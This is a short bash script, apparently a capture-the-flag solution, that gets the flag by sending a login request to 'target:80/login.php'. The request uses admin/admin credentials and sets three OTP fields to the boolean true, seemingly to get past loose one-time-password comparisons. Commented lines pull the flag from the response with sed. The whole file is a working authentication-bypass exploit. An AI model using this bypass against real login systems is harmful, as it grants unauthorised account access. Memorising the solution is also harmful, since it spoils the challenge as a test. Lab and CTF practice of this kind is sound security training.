#!/bin/bash

# Run the curl command, to get the flag
curl -s "target:80/login.php" --data '{"username":"admin","password":"admin","otp1":true,"otp2":true,"otp3":true}'

# Could cleanup and print flag by itself
#response=$(curl -s "target:80/login.php" --data '{"username":"admin","password":"admin","otp1":true,"otp2":true,"otp3":true}')
#flag=$(echo $response | sed -n 's/.*Congrats, here is your flag: \([^"]*\).*/\1/p')
